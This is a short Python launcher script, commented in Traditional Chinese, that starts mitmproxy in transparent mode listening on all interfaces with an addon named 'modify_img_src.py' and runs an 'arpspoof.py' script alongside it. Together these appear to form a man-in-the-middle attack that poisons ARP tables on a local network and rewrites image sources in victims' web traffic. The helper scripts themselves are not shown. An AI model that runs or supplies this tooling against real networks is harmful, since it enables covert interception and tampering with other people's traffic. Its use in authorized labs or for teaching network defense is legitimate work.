import subprocess
import os

# 指定 mitmproxy 和 arpspoof.py 的資料夾路徑
mitmproxy_dir = "./"
arpspoof_dir = "./"

# 定義 mitmproxy 的指令
mitmproxy_command = [
    "mitmproxy",
    "--mode", "transparent",
    "-s", "modify_img_src.py",
    "--set", "block_global=false",
    "--listen-host", "0.0.0.0"
]

# 定義 arpspoof.py 的指令
arpspoof_command = ["python", "arpspoof.py"]

# 使用 subprocess 啟動 mitmproxy 和 arpspoof.py，並指定工作目錄
try:
    mitmproxy_process = subprocess.Popen(mitmproxy_command, cwd=mitmproxy_dir)
    arpspoof_process = subprocess.Popen(arpspoof_command, cwd=arpspoof_dir)

    # 等待這兩個程式運行
    mitmproxy_process.wait()
    arpspoof_process.wait()

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Terminating processes.")

    # 終止這兩個進程
    mitmproxy_process.terminate()
    arpspoof_process.terminate()

    print("[+] Processes terminated.")
